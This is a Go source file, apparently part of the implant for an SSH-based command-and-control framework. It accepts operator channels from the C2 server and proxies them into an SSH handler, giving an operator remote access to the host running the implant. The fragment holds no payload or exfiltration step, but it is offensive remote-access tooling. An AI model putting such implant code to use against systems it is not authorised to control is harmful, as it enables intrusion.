package main

/*
 * c2chans.go
 * Channels between C2 and implant
 * By J. Stuart McMurray
 * Created 20220327
 * Last Modified 20220402
 */

import (
	"errors"
	"fmt"
	"io"
	"net"
	"sync"

	"github.com/magisterquis/jec2/pkg/common"
	"golang.org/x/crypto/ssh"
)

// HandleC2Chans handles channels between the C2 server and implant.
func HandleC2Chans(cc ssh.Conn, chans <-chan ssh.NewChannel) {
	ocn := 0
	for nc := range chans {
		switch t := nc.ChannelType(); t {
		case common.Operator: /* Someone wants to connect to us. */
			tag := fmt.Sprintf("o%d", ocn)
			ocn++
			go handleOperatorChan(tag, nc)
		default: /* Shouldn't get anything else. */
			Debugf("Unknown C2 channel type %s", t)
			nc.Reject(
				ssh.UnknownChannelType,
				fmt.Sprintf("Unimplemented: %s", t),
			)
		}
	}
}

/* handleOperatorChan handles a channel which carries an operator's SSH
connection. */
func handleOperatorChan(tag string, nc ssh.NewChannel) {
	/* Accept the channel. */
	ch, reqs, err := nc.Accept()
	if nil != err {
		Logf("[%s] Error accepting operator connection: %s", tag, err)
		return
	}
	defer ch.Close()
	Logf("[%s] New connection", tag)

	/* Shouldn't get any of these. */
	go func() {
		n := 0
		for req := range reqs {
			tag := fmt.Sprintf("%s-r%d", tag, n)
			n++
			Logf("[%s] Unexpected %q request", tag, req.Type)
		}
	}()

	/* SSH library requires a net.Conn.  We'll proxy the channel to what
	is more or less a wrapper. */
	cp, sp := net.Pipe()
	defer cp.Close()
	var wg sync.WaitGroup
	wg.Add(3)
	go func() {
		defer wg.Done()
		_, err := io.Copy(cp, ch)
		if nil != err && !errors.Is(err, io.EOF) {
			Logf(
				"[%s] Error proxying from C2 server "+
					"to SSH handler: %s",
				tag,
				err,
			)
		}
		cp.Close()
	}()
	go func() {
		defer wg.Done()
		_, err := io.Copy(ch, cp)
		if nil != err && !errors.Is(err, io.EOF) &&
			!errors.Is(err, io.ErrClosedPipe) {
			Logf(
				"[%s] Error proxying from SSH handler "+
					"to C2 server: %s %T",
				tag,
				err,
				err,
			)
		}
		if err := ch.CloseWrite(); nil != err &&
			!errors.Is(err, io.EOF) {
			Logf(
				"[%s] Error signalling end-of-write from "+
					"ssh Handler to C2 server: %s",
				tag,
				err,
			)
		}
	}()

	/* Upgrade to SSH. */
	go HandleOperatorConn(tag, sp, &wg)

	/* Wait for the proxying to die. */
	wg.Wait()
}
